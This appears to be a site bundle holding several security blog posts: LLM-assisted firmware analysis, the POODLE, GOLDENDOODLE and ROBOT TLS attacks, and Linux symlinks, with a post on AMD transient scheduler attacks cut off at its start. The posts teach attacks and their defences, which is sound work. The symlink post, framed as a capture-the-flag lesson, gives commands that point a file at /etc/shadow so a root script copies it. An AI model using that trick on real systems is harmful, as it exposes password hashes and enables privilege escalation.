  </p>

  <p>
    In this post, I’m <strong>not</strong> going to pretend that a Large Language Model (LLM) will magically reverse engineer your firmware for you. Instead, I’ll show how you can use an LLM as an <strong>annotator and sidekick</strong> while you do the real work:
  </p>

  <ul>
    <li>Turning messy <strong>strings</strong> into structured hints</li>
    <li>Summarizing <strong>decompiled functions</strong></li>
    <li>Hypothesizing the purpose of weird <strong>config blobs and scripts</strong></li>
    <li>Supporting your <strong>threat modeling</strong> of the device</li>
  </ul>

  <p>All in a way that keeps you in control, and the AI in a supporting role.</p>

  <blockquote>
    <span class="emoji">⚠️</span> Everything here is about <strong>defensive security / research on devices you own or are authorized to test</strong>.
    Don’t use these techniques on systems you’re not allowed to touch.
  </blockquote>

  <hr />

  <h2>1. The Traditional Firmware Exploration Workflow (Very Short Version)</h2>

  <p>A very typical firmware exploration flow looks like this:</p>

  <ol>
    <li>
      <strong>Obtain firmware</strong><br />
      From a vendor update file, web UI, or by dumping flash via JTAG / SPI.
    </li>
    <li>
      <strong>Triage and unpack</strong><br />
      Use tools like <code>binwalk</code>, <code>dd</code>, <code>unsquashfs</code>, or <code>firmware-mod-kit</code> to unpack file systems and images.
    </li>
    <li>
      <strong>Scan for strings and patterns</strong><br />
      Use <code>strings</code>, <code>grep</code>, or custom scripts to find credentials, URLs, debug commands, etc.
    </li>
    <li>
      <strong>Reverse engineer binaries</strong><br />
      Use tools like <strong>Ghidra</strong>, IDA, Radare2, or Binary Ninja to analyze executables and libraries.
    </li>
    <li>
      <strong>Dynamic analysis / rehosting</strong><br />
      Use QEMU or specialized frameworks for firmware rehosting to actually run firmware in a controlled environment and interact with it.
    </li>
  </ol>

  <p>
    Each step is noisy and produces walls of text and code. That’s where an LLM can make things <strong>less painful</strong>.
  </p>

  <hr />

  <h2>2. Where LLMs Actually Help: “Annotator, Not Autopilot”</h2>

  <p>
    Recent work has looked at using LLMs for <strong>binary code understanding</strong>, such as:
  </p>
  <ul>
    <li>Recovering function names</li>
    <li>Summarizing binary code behavior</li>
    <li>Explaining decompiled functions at a higher level</li>
  </ul>

  <p>
    Industry research has also explored LLMs as <strong>reverse engineering sidekicks</strong> that help malware analysts explain decompiled functions, outline control flows, or draft detection logic—without replacing analysts.
  </p>

  <blockquote>
    <strong>You</strong> do the reversing.<br />
    <strong>The LLM</strong> helps label, summarize, cluster, and explain.
  </blockquote>

  <p>
    Think of it as a hyperactive junior sitting next to you, happy to generate function names, markdown notes, and hypotheses while you decide what’s real and what’s hallucination.
  </p>

  <p>Let’s walk through some concrete examples.</p>

  <hr />

  <h2>3. Strings + LLM: Turning Noise Into Hints</h2>

  <p>A classic first step on a firmware image is just:</p>

  <pre><code>strings firmware.bin | less</code></pre>

  <p>
    But this dumps <em>everything</em>: menu texts, error messages, random config keys, leftover debug prints, etc. You can make this a lot more effective with a little Python and an LLM.
  </p>

  <h3>3.1 Step 1 – Extract and filter strings</h3>

  <p>Here’s a small Python script to extract printable strings from a firmware blob:</p>

  <pre><code>import re
from pathlib import Path

def extract_strings(path, min_len=4):
    data = Path(path).read_bytes()
    pattern = rb"[ -~]{%d,}" % min_len  # printable ASCII
    return [s.decode(errors="ignore") for s in re.findall(pattern, data)]

if __name__ == "__main__":
    strings = extract_strings("firmware.bin")

    # Naive filters: paths, URLs, shell-like commands
    interesting = [
        s for s in strings
        if ("/" in s or "http" in s or "ssh" in s or "admin" in s.lower())
    ]

    for s in interesting[:50]:
        print(s)</code></pre>

  <p>
    You now have a list of “interesting” candidate strings: endpoints, file paths, error messages, maybe even hidden menu options.
  </p>

  <h3>3.2 Step 2 – Ask the LLM to annotate</h3>

  <p>
    Take a subset of these strings (don’t paste your entire firmware dump into a cloud LLM—be mindful of confidentiality) and send them to an LLM with a prompt like:
  </p>

  <blockquote>
    You are an embedded security analyst.<br />
    The following strings were extracted from a router firmware image.<br /><br />
    1. <code>/bin/diagnostic_cli</code><br />
    2. <code>/usr/sbin/backup_cfg</code><br />
    3. <code>POST /apply.cgi</code><br />
    4. <code>admin:admin</code><br />
    5. <code>Enable remote management</code><br /><br />
    For each string:<br />
    - Guess what subsystem it might belong to (web UI, update system, debug, etc.).<br />
    - Mark whether it’s <strong>interesting for security review</strong> and why (1–2 sentences).
  </blockquote>

  <p>
    In code (pseudo-style, using a generic <code>llm_chat()</code> helper so you can plug in OpenAI / local LLM / etc.):
  </p>

  <pre><code>def annotate_strings_with_llm(strings_chunk):
    prompt = (
        "You are an embedded firmware security analyst.\\n\\n"
        "You are given a list of strings extracted from firmware.\\n"
        "For each string, produce:\\n"
        "- category: (web_ui | auth | config | debug | logging | update | other)\\n"
        "- interesting: (yes/no)\\n"
        "- reason: one short sentence.\\n\\n"
        "Strings:\\n"
        + "\\n".join(f"- {s}" for s in strings_chunk)
    )
    # Replace this with your LLM client call
    response = llm_chat(prompt)
    return response

if __name__ == "__main__":
    strings = extract_strings("firmware.bin")
    interesting = [...]  # apply your filters
    chunk = interesting[:40]
    print(annotate_strings_with_llm(chunk))</code></pre>

  <p>
    Suddenly, instead of reading 300 anonymous strings, you get a <strong>structured, human-readable checklist</strong>:
  </p>

  <ul>
    <li>Possible backup subsystem</li>
    <li>Potential default creds</li>
    <li>Hidden diagnostic binaries</li>
    <li>Suspicious URLs / endpoints</li>
  </ul>

  <p>
    You still have to verify everything—but now you have a <strong>prioritized map</strong>.
  </p>

  <hr />

  <h2>4. Ghidra + LLM: Explaining Weird Functions</h2>

  <p>
    Once you move into static analysis, tools like <strong>Ghidra</strong> are the workhorse for exploring firmware binaries. You load ELF/ARM/MIPS binaries, let Ghidra analyze them, and then decompile functions into a pseudo-C view.
  </p>

  <p>
    The hard part is not “disassembling”—it’s <strong>understanding</strong> what a function actually does.
  </p>

  <p>
    Research and experiments with LLMs show they can help with tasks like:
  </p>
  <ul>
    <li><strong>Function name recovery</strong></li>
    <li><strong>Code summarization</strong></li>
    <li>Highlighting security-relevant behavior (auth, crypto, file access, network I/O, etc.)</li>
  </ul>

  <p>That’s perfect for our “annotator” idea.</p>

  <h3>4.1 Workflow</h3>

  <ol>
    <li>
      In Ghidra, decompile a function you suspect is security-relevant:
      <ul>
        <li>Maybe it’s referenced from the <code>/login</code> CGI handler</li>
        <li>Or from a firmware update routine</li>
      </ul>
    </li>
    <li>Copy a sanitized snippet of the decompiled C-like code (omit hard-coded secrets / proprietary stuff if using a cloud LLM).</li>
    <li>Ask the LLM something like:</li>
  </ol>

  <blockquote>
    You are assisting with firmware reverse engineering.<br />
    Here is a decompiled function from an embedded Linux binary (MIPS):<br /><br />
    <pre><code>int sub_40123C(char *user, char *pw) {
    FILE *f = fopen("/etc/passwd", "r");
    if (!f) return -1;
    ...
}</code></pre>
    Tasks:<br />
    1. Give this function a descriptive name (C-style).<br />
    2. Summarize what it does in bullets.<br />
    3. Call out any security-relevant behavior (auth checks, file access, cryptography, etc.).
  </blockquote>

  <p>You’ll often get surprisingly good results:</p>

  <ul>
    <li>Suggested names like <code>check_user_credentials</code>, <code>verify_login</code>, etc.</li>
    <li>Bullet summaries that highlight comparisons, suspicious file paths, or insecure checks.</li>
  </ul>

  <p>
    You can even script this: export decompiled functions or their summaries and feed them to an LLM in batches, building a <strong>“map” of the binary</strong> where each function has:
  </p>

  <ul>
    <li>A human-readable name</li>
    <li>A short description</li>
    <li>Tags like <code>auth</code>, <code>crypto</code>, <code>network</code>, <code>update</code></li>
  </ul>

  <p>
    This mirrors workflows used in both academic research and experimental tools that use LLMs as reverse engineering assistants for malware and binaries.
  </p>

  <hr />

  <h2>5. Configs, Scripts, and “Weird Blobs”: Semantic Tagging</h2>

  <p>
    Firmware images are full of non-binary artifacts:
  </p>
  <ul>
    <li>Shell scripts for initialization</li>
    <li>Lua / Python / proprietary scripting languages</li>
    <li>JSON / XML / custom config formats</li>
    <li>Web templates for CGI-based admin interfaces</li>
  </ul>

  <p>Instead of manually reading each file, you can:</p>

  <ol>
    <li><strong>Programmatically find candidates</strong> – files under <code>/etc/</code>, <code>/usr/script/</code>, <code>/www/</code>, etc.</li>
    <li><strong>Summarize them with an LLM</strong> to label purpose and risk.</li>
  </ol>

  <h3>5.1 Example: scanning shell scripts</h3>

  <pre><code>from pathlib import Path

def list_shell_scripts(root):
    root = Path(root)
    return list(root.rglob("*.sh"))

def summarize_script(path):
    content = Path(path).read_text(errors="ignore")[:4000]  # truncate just in case
    prompt = (
        "You are reviewing firmware init scripts.\\n\\n"
        f"File path: {path}\\n"
        "Script:\\n\\n"
        "\`\`\`sh\\n"
        f"{content}\\n"
        "\`\`\`\\n\\n"
        "Tasks:\\n"
        "1. Briefly summarize what this script does.\\n"
        "2. Call out any security-relevant actions "
        "(starting services, changing permissions, touching auth/crypto, enabling remote access).\\n"
        "3. Rate its review priority: high / medium / low.\\n"
    )
    return llm_chat(prompt)

if __name__ == "__main__":
    for p in list_shell_scripts("squashfs-root"):
        print("=== ", p, " ===")
        print(summarize_script(p))
        print()</code></pre>

  <p>This gives you:</p>

  <ul>
    <li>A quick view of <strong>which scripts matter</strong> (e.g., those enabling remote management or manipulating firewall rules).</li>
    <li>A better starting point when you need to dive deeper manually.</li>
  </ul>

  <p>You can do the same for:</p>

  <ul>
    <li>JSON configs: ask which keys look like <strong>feature flags</strong>, <strong>debug options</strong>, or <strong>update URLs</strong>.</li>
    <li>HTTP templates: ask which endpoints perform sensitive operations.</li>
  </ul>

  <hr />

  <h2>6. LLMs + Rehosting: Augmenting Dynamic Analysis</h2>

  <p>
    The more hardcore end of firmware analysis involves <strong>rehosting</strong>: running firmware in an emulated environment to see how it behaves at runtime. Researchers and practitioners use various frameworks to emulate peripheral devices and remove hardware dependencies.
  </p>

  <p>LLMs can help here too—but again, as annotators:</p>

  <ul>
    <li>
      <strong>Log analysis:</strong> feed chunks of runtime logs (HTTP requests, kernel messages, application logs) into the LLM and ask it to:
      <ul>
        <li>Summarize what the system is doing</li>
        <li>Highlight errors, crashes, or suspicious patterns (e.g., repeated failed logins)</li>
      </ul>
    </li>
    <li>
      <strong>Crash triage:</strong> when fuzzers targeting BusyBox or embedded binaries produce crashing inputs and stack traces, LLMs can help cluster and explain crash types.
    </li>
  </ul>

  <h3>6.1 Example prompt for log triage</h3>

  <blockquote>
    You are a firmware analyst. The following log lines come from an emulated router firmware:<br /><br />
    <pre><code>[HTTPD] POST /apply.cgi action=wan_settings
[HTTPD] user=admin from 192.168.0.10
[KERNEL] device eth0 entered promiscuous mode
[APP] enabling remote_management on port 8080
...</code></pre>
    1. Summarize the key events.<br />
    2. Identify any security-relevant changes.<br />
    3. Suggest 2–3 follow-up checks I should perform against this firmware.
  </blockquote>

  <p>
    You get a quick <strong>human-level summary</strong> instead of reading 500 lines manually.
  </p>

  <hr />

  <h2>7. Limitations and Risks: This Is Not Magic (and That’s Good)</h2>

  <p>Before we get too excited, reality check:</p>

  <ol>
    <li>
      <strong>Hallucinations are real</strong><br />
      LLMs can improve naming and summarization, but they still get things wrong and may invent functionality that isn’t present.
      <ul>
        <li>Never treat LLM output as ground truth.</li>
        <li>Use it as a <strong>hint</strong>, then confirm by reading the actual code / disassembly.</li>
      </ul>
    </li>
    <li>
      <strong>Confidentiality and IP</strong><br />
      If you’re analyzing proprietary firmware, uploading large chunks to a cloud LLM may be unacceptable (legally, ethically, or by contract).
      <ul>
        <li>Consider <strong>local open-source models</strong> for sensitive work.</li>
        <li>Use strict data minimization: send only what you must (e.g., one function, one script).</li>
      </ul>
    </li>
    <li>
      <strong>Ethics and legality</strong><br />
      Secure development and IoT guidance emphasize secure design, responsible vulnerability management, and lifecycle support.
      <ul>
        <li>Use these techniques to <strong>improve</strong> security, not undermine it.</li>
        <li>Follow responsible disclosure practices if you discover real issues.</li>
      </ul>
    </li>
    <li>
      <strong>Skill still required</strong><br />
      Experiences from LLM-powered reverse engineering consistently conclude that LLMs <strong>augment experts</strong>; they don’t turn beginners into instant firmware ninjas.
      <ul>
        <li>You still need to know how toolchains, OSes, networking, and cryptography work.</li>
        <li>LLMs amplify good analysts; they don’t replace them.</li>
      </ul>
    </li>
  </ol>

  <hr />

  <h2>8. Practical Tips: Making LLMs a Useful Firmware Sidekick</h2>

  <p>If you want to actually integrate LLMs into your firmware workflow, here are some practical patterns:</p>

  <ol>
    <li>
      <strong>Use strong roles in prompts</strong>
      <ul>
        <li>“You are an embedded firmware security analyst.”</li>
        <li>“You are assisting reverse engineering of a MIPS-based router binary.”</li>
      </ul>
    </li>
    <li>
      <strong>Give context concisely</strong>
      <ul>
        <li>Mention architecture (ARM/MIPS/x86), OS (Linux/RTOS), and approximate purpose (router, camera, PLC).</li>
        <li>This helps the model make better guesses about functions and config files.</li>
      </ul>
    </li>
    <li>
      <strong>Chunk smartly</strong>
      <ul>
        <li>Don’t send entire file systems.</li>
        <li>Work per-function, per-script, or per-log-chunk.</li>
      </ul>
    </li>
    <li>
      <strong>Always ask for structure</strong><br />
      Ask for JSON-like or bullet-pointed output, for example:
      <pre><code>{
  "function_name": "...",
  "high_level_summary": "...",
  "security_relevance": "..."
}</code></pre>
      <p>This makes it easier to feed back into your own tooling.</p>
    </li>
    <li>
      <strong>Build your own “knowledge notebook”</strong>
      <ul>
        <li>Store LLM explanations in markdown or a small database.</li>
        <li>Link them back to offsets / function addresses / file paths so you can quickly revisit them later.</li>
      </ul>
    </li>
    <li>
      <strong>Compare models</strong>
      <ul>
        <li>Some models are better at code; others at natural language.</li>
        <li>Try both cloud and local options, especially if you need privacy.</li>
      </ul>
    </li>
  </ol>

  <hr />
</body>
</html>`,Yg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>POODLE and GOLDENDOODLE Attacks</title>

  <!-- Link to the common style.css -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">POODLE and GOLDENDOODLE Attacks</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <main>
    <section class="blog-post-content">
      <div class="container">
        <p>
          Encryption protocols are the bedrock of secure online communication, ensuring that data transmitted over
          networks remains confidential and protected from unauthorized access. However, like any technology,
          encryption protocols can have vulnerabilities that skilled attackers can exploit. Two such attacks,
          <b>POODLE</b> (Padding Oracle On Downgraded Legacy Encryption) and <b>GOLDENDOODLE</b>, have gained
          attention for exploiting weaknesses in SSL and TLS, respectively. This blog provides an in-depth look at
          these attacks, how they work, and their implications for modern cybersecurity.
        </p>

        <h2>POODLE Attack (Padding Oracle On Downgraded Legacy Encryption)</h2>
        <h3>Introduction</h3>
        <p>
          The POODLE attack, discovered by Google researchers in October 2014, targets the SSL 3.0 (Secure Sockets
          Layer) protocol. Despite SSL 3.0 being considered obsolete and replaced by more secure protocols like TLS
          (Transport Layer Security), many servers and clients still support SSL 3.0 for backward compatibility
          reasons. This presents a security risk as POODLE takes advantage of vulnerabilities in how SSL 3.0
          implements padding for block cipher encryption, enabling attackers to decrypt sensitive information such
          as cookies, passwords, and session tokens.
        </p>

        <h3>How SSL 3.0 Works</h3>
        <p>
          SSL 3.0 uses block ciphers in CBC (Cipher Block Chaining) mode. This mode encrypts data by dividing it
          into fixed-size blocks, typically 64 or 128 bits. When the data is not a multiple of the block size,
          padding is added to fill the last block. This padding is where SSL 3.0’s vulnerability lies.
        </p>
        <p>
          When a message is decrypted, the padding is checked for correctness. However, SSL 3.0 does not explicitly
          verify the padding bytes, allowing attackers to use a padding oracle attack. If an attacker can observe
          how a server responds to different padding values, they can slowly infer the content of the encrypted
          message.
        </p>

        <h3>POODLE Attack Workflow</h3>
        <ol>
          <li>
            <b>Downgrade Attack:</b> Many browsers and servers that support TLS also support SSL 3.0 for backward
            compatibility. An attacker can exploit this by forcing the connection to downgrade from the more secure
            TLS protocol to SSL 3.0. This is done by intercepting and tampering with the initial handshake between
            the client and the server.
          </li>
          <li>
            <b>Padding Oracle Exploitation:</b> Once SSL 3.0 is being used, the attacker can send maliciously
            crafted requests containing intentionally incorrect padding. Based on the server’s response (e.g., an
            error message or no response), the attacker can infer whether the padding was correct. This
            side-channel information can then be used to decrypt the message byte-by-byte.
          </li>
          <li>
            <b>Decrypting Sensitive Data:</b> With enough time and crafted requests, an attacker can decrypt data
            like authentication cookies, which are used to identify the user in a session. This allows the attacker
            to hijack the user’s session and potentially gain unauthorized access to sensitive information.
          </li>
        </ol>

        <h3>Vulnerable Systems</h3>
        <ul>
          <li>Systems that still support SSL 3.0 for backward compatibility.</li>
          <li>Systems that use CBC-mode cipher suites with SSL 3.0.</li>
        </ul>

        <h3>Impact</h3>
        <p>
          The POODLE attack poses a significant risk because it allows attackers to decrypt HTTPS-protected data,
          exposing sensitive user information. Once decrypted, this information can be used to impersonate users,
          steal credentials, and compromise web sessions.
        </p>

        <h3>Mitigation Strategies</h3>
        <ul>
          <li><b>Disable SSL 3.0:</b> Prevent POODLE attacks by disabling SSL 3.0 on both the client and server.</li>
          <li>
            <b>Enforce TLS-Only Communication:</b> Ensure that all clients and servers use TLS 1.2 or higher
            exclusively. By refusing to accept SSL 3.0 connections, you mitigate the possibility of an attacker
            forcing a downgrade.
          </li>
          <li>
            <b>Enable Secure Cipher Suites:</b> Use secure cipher suites that are not vulnerable to padding oracle
            attacks. Configure your web server to prioritize AEAD (Authenticated Encryption with Associated Data)
            cipher suites.
          </li>
        </ul>

        <h2>GOLDENDOODLE Attack</h2>
        <h3>Introduction</h3>
        <p>
          The GOLDENDOODLE attack, discovered in 2019, is an extension of padding oracle attacks. It specifically
          targets TLS 1.0, 1.1, and 1.2 implementations that use CBC-mode encryption. Like POODLE, it exploits
          vulnerabilities in block cipher padding.
        </p>

        <h3>Mitigation Strategies</h3>
        <ul>
          <li><b>Upgrade to TLS 1.3:</b> The most effective mitigation is upgrading to TLS 1.3.</li>
          <li>
            <b>Disable CBC-Mode Cipher Suites:</b> Use secure alternatives like GCM (Galois/Counter Mode), which is
            less prone to padding attacks.
          </li>
          <li>
            <b>Apply Security Patches:</b> Ensure systems are updated with the latest security patches for TLS
            implementations.
          </li>
        </ul>
      </div>
    </section>
  </main>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,qg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>The ROBOT Attack: Return of Bleichenbacher’s Oracle Threat</title>

  <!-- Link to the common style.css -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">The ROBOT Attack: Return of Bleichenbacher’s Oracle Threat</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <main>
    <section class="blog-post-content">
      <div class="container">
        <p>
          In 2017, security researchers uncovered a vulnerability that re-exposed a nearly two-decade-old attack against RSA encryption in TLS (Transport Layer Security): the <b>ROBOT attack</b> (Return of Bleichenbacher’s Oracle Threat). Originally discovered by Daniel Bleichenbacher in 1998, the Bleichenbacher Oracle Attack allowed attackers to decrypt sensitive data, such as session keys, by exploiting certain flawed implementations of RSA.
        </p>
        <p>
          Despite advancements in cryptography, misconfigurations in modern RSA implementations have resurfaced this threat, putting specific systems at risk even today. This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.
        </p>

        <h2>How the ROBOT Attack Works</h2>
        <p>
          At the heart of the ROBOT attack is an interaction between a vulnerable server and an attacker where the server unintentionally leaks information about encrypted messages. This process allows attackers to decrypt RSA ciphertexts or perform signing operations with the server’s private key.
        </p>
        <p>
          The attacker sends deliberately malformed RSA ciphertexts to the server, and based on the server’s response (the “oracle”), they can infer details about the decrypted plaintext. By repeating this process enough times, they can eventually decrypt sensitive information.
        </p>

        <h3>Step-by-Step Breakdown of ROBOT:</h3>
        <ol>
          <li><b>Malformed Ciphertexts:</b> The attacker sends specially crafted RSA ciphertexts to the vulnerable server.</li>
          <li><b>Oracle Response:</b> The server attempts to decrypt the ciphertext and responds with information revealing whether the decryption was successful.</li>
          <li><b>Iteration Process:</b> The attacker uses the server’s responses to refine their guesses, repeating this process multiple times.</li>
          <li><b>Decryption of Sensitive Data:</b> After enough iterations, the attacker can decrypt sensitive data such as TLS session keys.</li>
        </ol>

        <h2>Real-World Example of ROBOT</h2>
        <p>
          To better understand how this attack can be used in real-world scenarios, consider a web server that uses RSA encryption to secure TLS connections. If the server’s RSA implementation is vulnerable, an attacker can exploit it to decrypt sensitive information.
        </p>
        <p>
          For example, if a banking website is vulnerable to ROBOT, an attacker could gain access to the TLS session keys, which would allow them to decrypt sensitive information such as login credentials, transaction details, and personal user data. This could lead to serious breaches in confidentiality and data security.
        </p>

        <h2>Affected Systems</h2>
        <p>Various widely-used products have been found vulnerable to ROBOT, including:</p>
        <ul>
          <li>OpenSSL (before version 1.0.2h)</li>
          <li>F5 Networks BIG-IP load balancers</li>
          <li>Cisco devices</li>
          <li>Certain Oracle and Citrix products</li>
        </ul>
        <p>
          Though many systems have since been patched, ROBOT still poses a risk to any system that hasn’t been updated to mitigate this vulnerability.
        </p>

        <h2>Mitigation and Prevention</h2>
        <p>
          Preventing ROBOT attacks requires system administrators and developers to ensure that their RSA implementations are correctly configured. Here are some steps to mitigate the risk of ROBOT:
        </p>
        <ul>
          <li><b>Disable RSA Encryption:</b> The most effective protection is to disable RSA key exchange in favor of Elliptic Curve Diffie-Hellman (ECDHE), which provides forward secrecy and is not vulnerable to ROBOT.</li>
          <li><b>Apply Security Patches:</b> Ensure that you’re using the latest versions of your software libraries and applying all relevant security patches. For instance, upgrading to OpenSSL 1.0.2h or later will mitigate the ROBOT attack.</li>
          <li><b>Implement Stronger Cryptographic Methods:</b> Use stronger encryption protocols such as Elliptic Curve Cryptography (ECC) to secure communications. ECC-based methods, like ECDHE, are considered more secure and resistant to attacks like ROBOT.</li>
          <li><b>Regular Vulnerability Testing:</b> Conduct routine vulnerability assessments and audits to identify and address potential misconfigurations or weaknesses in cryptographic implementations.</li>
        </ul>

        <h3>Example of Mitigation in OpenSSL:</h3>
<div class="code-block">
  <code>
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers on;
    ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';
  </code>
</div>
<p>
  This configuration forces the server to use Elliptic Curve Diffie-Hellman key exchange methods, providing forward secrecy and reducing the risk of a ROBOT attack.
</p>

        <h2>Conclusion</h2>
        <p>
          The ROBOT attack underscores how vulnerabilities from decades ago can resurface in modern systems due to misconfigurations or unpatched software. Although the original Bleichenbacher attack was discovered in 1998, its return in 2017 highlights the importance of staying vigilant in cryptographic practices and regularly updating systems.
        </p>
        <p>
          By disabling RSA key exchanges, patching vulnerable systems, and implementing stronger encryption protocols, administrators can effectively mitigate the risk of ROBOT attacks and protect sensitive data.
        </p>
      </div>
    </section>
  </main>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Xg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Exploring Symlinks: Practical Usage and Security Implications</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Exploring Symlinks: Practical Usage and Security Implications</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What Are Symlinks?</h2>
        <p>
          In Linux, symbolic links are essentially shortcuts that point to other files or directories. They allow you to reference a file or directory without duplicating its contents. Symlinks are incredibly useful when you need to access or organize files in multiple locations. However, if used carelessly, they can create security vulnerabilities, particularly when root-owned processes interact with user-created symlinks.
        </p>

        <h3>Hard Links vs. Symbolic Links</h3>
        <ul>
          <li><strong>Hard Links:</strong> Direct references to data on disk. Hard links share the same inode with the original file, meaning they’re identical and can’t link to directories.</li>
          <li><strong>Symbolic Links (Symlinks):</strong> References that point to the path of a target file or directory. Symlinks are separate from the original file’s data, so deleting the target will break the link.</li>
        </ul>

        <h2>Creating and Using Symlinks</h2>
        <p>The basic syntax for creating a symlink is:</p>
        <div class="code-block">
          <code>ln -s [target] [symlink_name]</code>
        </div>
        <p>
          • <strong>[target]:</strong> The file or directory you want to link to.<br>
          • <strong>[symlink_name]:</strong> The name of your symlink.
        </p>

        <h3>Examples</h3>
        <div class="code-block">
          <code>
# Creating a symlink to a file<br>
ln -s /home/user/documents/file.txt /home/user/desktop/file_link.txt
          </code>
        </div>
        <p>This creates <code>file_link.txt</code> on your desktop, which behaves like a shortcut to <code>file.txt</code>.</p>

        <div class="code-block">
          <code>
# Creating a symlink to a directory<br>
ln -s /home/user/projects /home/user/desktop/projects_link
          </code>
        </div>
        <p>Accessing <code>projects_link</code> will take you directly to <code>/home/user/projects</code>.</p>

        <h3>Overwriting an Existing Symlink</h3>
        <div class="code-block">
          <code>ln -sf /new/target/path /path/to/existing_symlink</code>
        </div>
        <p>The <code>-f</code> option forces the update of the symlink’s target.</p>

        <h2>Privilege Escalation Using Symlinks</h2>
        <p>
          During my Hack The Box challenge, I learned how symlinks can be used to escalate privileges when system configurations are insecure. Here’s how this works:
        </p>

        <h3>Scenario: Exploiting a Root-Owned Script</h3>
        <p>
          Imagine a script (<code>backup.sh</code>) owned by root regularly copies files from a directory to a root-owned backup location. If the script is designed to follow any symlinks it encounters, this could give normal users access to root-level files.
        </p>

        <h3>Steps to Exploit</h3>
        <div class="code-block">
          <code>
# Step 1: Remove any existing file at /tmp/important_file<br>
rm -f /tmp/important_file<br><br>
# Step 2: Create a symlink pointing to /etc/shadow<br>
ln -s /etc/shadow /tmp/important_file<br><br>
# Step 3: Wait for the root script to run or run it manually if possible<br>
          </code>
        </div>
        <p>
          If the root script copies <code>/etc/shadow</code> to a location accessible to the user, the user can potentially gain root-level information and escalate privileges.
        </p>

        <h2>Mitigating This Exploit</h2>
        <ul>
          <li><strong>Avoid Following Symlinks in Scripts:</strong> Avoid copying or modifying files without checking for symlinks, especially in root-owned scripts.</li>
          <li><strong>Use the <code>-P</code> Option in <code>cp</code>:</strong> This flag tells <code>cp</code> not to follow symlinks, helping to prevent exploitation.</li>
          <li><strong>Restrict Writable Directories:</strong> Limit permissions on directories where files are written or manipulated by privileged processes.</li>
        </ul>

        <h2>Conclusion</h2>
        <p>
          Symlinks are an incredibly powerful tool for managing files and directories, but they come with inherent risks if not handled carefully. Understanding how symlinks work and the potential security implications is critical for both system administrators and security professionals. Whether you're organizing files or working on penetration testing challenges, symlinks offer both utility and insight into system-level operations.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Kg=`<div class="markdown-heading"><h1 class="heading-element">Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak</h1><a id="user-content-transient-scheduler-attacks-on-cpus-exploiting-amds-new-microarchitectural-leak" class="anchor" aria-label="Permalink: Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak" href="#transient-scheduler-attacks-on-cpus-exploiting-amds-new-microarchitectural-leak"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>In 2018, <em>Spectre</em> and <em>Meltdown</em> taught everyone that “just running code” on a CPU was enough to leak data you were <em>never</em> supposed to see. We patched, mitigated, and told ourselves the worst was over.</p>
<p>Fast-forward to 2025 and AMD quietly drops a new phrase into the hardware-security lexicon:</p>
<blockquote>
